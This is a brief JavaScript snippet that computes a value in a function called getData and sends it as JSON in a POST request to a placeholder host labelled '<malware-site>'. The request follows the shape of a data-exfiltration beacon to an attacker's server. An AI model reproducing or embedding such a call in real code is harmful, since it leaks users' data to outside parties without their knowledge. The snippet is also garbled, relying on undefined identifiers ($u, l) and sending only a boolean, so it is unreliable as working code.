function getData() {
    return process.env.NODE_ENV !== "production" && $u.isElement(l);
}

var data = getData();

const xhr = new XMLHttpRequest();
xhr.open("POST", "https://<malware-site>");
xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
const body = JSON.stringify(data);
xhr.send(body);